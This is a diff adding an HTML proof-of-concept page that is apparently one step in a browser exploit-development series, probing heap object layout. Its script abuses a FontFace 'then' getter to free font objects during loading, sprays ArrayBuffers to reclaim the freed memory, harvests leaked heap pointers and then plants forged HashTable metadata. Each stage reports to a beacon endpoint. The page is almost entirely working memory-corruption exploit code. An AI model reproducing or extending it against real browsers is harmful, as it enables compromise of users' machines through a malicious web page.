@@ -1,0 +1,130 @@
+<!--
+  p582: +0x58 Table Geometry Discrimination (settles Issue #179 Contradiction C1).
+
+  Tests whether the pointer at +0x58 points to:
+    - Shape A (impl pointer): +0x58 dereferences into a separate heap object
+      containing HashTable metadata {m_table, m_tableSize, m_tableSizeMask, ...}.
+    - Shape B (direct entry array): +0x58 points directly to an array of WeakPtrImpl*
+      pointers (as depicted in direct HashTable models).
+
+  Usage:
+    p582-table-geometry-discrim.html?geom=impl    (tests Shape A: indirect impl object)
+    p582-table-geometry-discrim.html?geom=entry   (tests Shape B: direct entry array)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p582 table geometry discrimination</title>
+<script>
+var QS = location.search;
+function q(n, d) { var m = new RegExp('[?&]' + n + '=([^&]*)').exec(QS); return m ? m[1] : d; }
+var GEOM = q('geom', 'impl');
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var K=8, SIZE=192, styleEl=null, firedHere=false, stage=0, leaked={p58:null,p68:null};
+function hex(v){return ('0' + v.toString(16)).slice(-2);}
+function grab(view, off){ var a=[]; for(var i=0;i<8;i++) a.push(view[off+i]); return a; }
+
+function writeD(view, off, val){
+  view[off]   = val & 0xFF;         view[off+1] = (val >> 8) & 0xFF;
+  view[off+2] = (val >> 16) & 0xFF; view[off+3] = (val >> 24) & 0xFF;
+}
+
+function writeQ(view, off, lo, hi){
+  view[off]   = lo & 0xFF;         view[off+1] = (lo >> 8) & 0xFF;
+  view[off+2] = (lo >> 16) & 0xFF; view[off+3] = (lo >> 24) & 0xFF;
+  view[off+4] = hi & 0xFF;         view[off+5] = (hi >> 8) & 0xFF;
+  view[off+6] = (hi >> 16) & 0xFF; view[off+7] = (hi >> 24) & 0xFF;
+}
+
+function setupFace(name, css){
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A); void A.loaded; window.__alive.push(A);
+}
+
+function installGetter(){
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        if (stage === 1 && leaked.p58) {
+          // RefCount = 2
+          v[0] = 2; v[1] = 0; v[2] = 0; v[3] = 0;
+          v.set(leaked.p58, 0x58);
+          v.set(leaked.p68, 0x68);
+
+          if (GEOM === 'impl') {
+            // Shape A: Format fake impl layout
+            // +0x00: m_table pointer (points further in lane or secondary buffer)
+            // +0x08: m_tableSize = 4, +0x0C: m_tableSizeMask = 3
+            // +0x10: m_keyCount = 1,  +0x14: m_deletedCount = 0
+            writeD(v, 0x08, 4);
+            writeD(v, 0x0C, 3);
+            writeD(v, 0x10, 1);
+            writeD(v, 0x14, 0);
+          } else {
+            // Shape B: Direct entry array layout
+            // Entries are sequential WeakPtrImpl* pointers
+            writeQ(v, 0x10, 0, 0);
+            writeQ(v, 0x18, 0, 0);
+          }
+        }
+        window.__map.push({ size: SIZE, view: v });
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+}
+
+function start(){
+  window.__alive = [];
+  stage = 0;
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('P582-SETUP-geom=' + GEOM);
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function(){ b('P582-S1-RESOLVED'); },
+    function(){ b('P582-S1-REJECTED'); }
+  );
+  setTimeout(scan1, 120);
+}
+
+function scan1(){
+  var m = window.__map || [], best = -1, nz = 0;
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) n++;
+    if (n > nz) { nz = n; best = i; }
+  }
+  if (best < 0) { b('P582-S1-CLEAN'); return; }
+  var v = m[best].view;
+  leaked.p58 = grab(v, 0x58); leaked.p68 = grab(v, 0x68);
+  var s = ''; for (var j = 0; j < v.length; j++) if (v[j] !== 0) s += hex(v[j]);
+  b('P582-S1-HIT-geom=' + GEOM + '-s=' + s);
+
+  stage = 1;
+  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
+  installGetter();
+  b('P582-S2-ARMED-geom=' + GEOM);
+  document.fonts.load('1em f1, s1', 'AB').then(
+    function(){ b('P582-S2-RESOLVED-geom=' + GEOM); },
+    function(){ b('P582-S2-REJECTED-geom=' + GEOM); }
+  );
+  setTimeout(function(){ b('P582-S2-ALIVE-geom=' + GEOM + '-' + (firedHere ? 1 : 0)); }, 600);
+}
+
+function run(){ start(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p582 table geometry discrimination</p></body></html>
